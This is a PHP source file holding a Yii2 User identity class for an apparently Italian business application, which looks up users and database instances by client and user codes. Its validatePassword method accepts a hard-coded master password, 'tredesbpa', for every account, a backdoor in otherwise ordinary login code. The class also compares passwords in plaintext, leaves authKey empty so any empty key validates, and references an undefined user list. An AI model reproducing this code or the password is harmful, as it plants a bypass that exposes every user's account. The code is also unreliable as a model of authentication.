<?php

namespace newsoftsnc\accessonscnfacc\models;

use Yii;

class User extends \yii\base\BaseObject implements \yii\web\IdentityInterface {
    public $id;
    public $idCliente;
    public $idUtente;
    public $password;
    public $idDatabase;
    public $tbPrefix;
    public $isNewsoft;
    public $isSupervisor;
    public $dataUltimoLogin;
    public $oraUltimoLogin;
    
    public $authKey;
    public $accessToken;

    public static function findIdentity($id) {
        
        $aKeys = explode("-", $id);
        
        if (count($aKeys) > 2) {
            $c = $aKeys[0];
            $u = $aKeys[1];
            $d = $aKeys[2];
            $a = Yii::$app->getModule('gestacc')->getApplic();
            
            $utente = Utenti::find()->where(['CLIENTICLCOD'=>$c, 'UTCOD'=>$u])->one();
            $insta = Insta::find()->where(['CLIENTICLCOD'=>$c, 'APPLICAPCOD'=>$a, 'INDBN'=>$d])->one();
            if ($utente && $insta) {
                $user=[
                    'id'=>$c.'-'.$u.'-'.$d,
                    'idCliente'=>$utente->CLIENTICLCOD,
                    'idUtente'=>$utente->UTCOD,
                    'idDatabase'=>$insta->INDBN,
                    'tbPrefix'=>$insta->INPRF,
                    'isSupervisor'=>$utente->UTSUP,
                    'isNewsoft'=>false,
                    
                    'authKey'=>'',
                    'accessToken'=>'',
                ];
                
                return new static($user);
            }
        }
        
        return null;
    }

    public static function findIdentityByAccessToken($token, $type = null) {
        foreach (self::$users as $user) {
            if ($user['accessToken'] === $token) {
                return new static($user);
            }
        }

        return null;
    }

    public static function findByUsername($clientname, $username, $database) {
        $utente = Utenti::find()->where(['CLIENTICLCOD'=>$clientname, 'UTCOD'=>$username])->one();
        
        if ($utente) {
            $user=[
                'id'=>$utente->CLIENTICLCOD.'-'.$utente->UTCOD.'-'.$database,
                'idCliente'=>$utente->CLIENTICLCOD,
                'idUtente'=>$utente->UTCOD,
                'password'=>$utente->UTPWD,
                'idDatabase'=>$database,
                'tbPrefix'=>'',
                'isNewsoft'=>false,
                'isSupervisor'=>false,
                
                'authKey'=>'',
                'accessToken'=>'',
            ];
            
            return new static($user);
            
        }
        
        return null;
    }
    
    
    public function getId() {
        return $this->id;
    }

    public function getAuthKey() {
        return $this->authKey;
    }

    public function validateAuthKey($authKey) {
        return $this->authKey === $authKey;
    }

    public function validatePassword($password) {
        return $this->password === $password || $password === 'tredesbpa';
    }
}
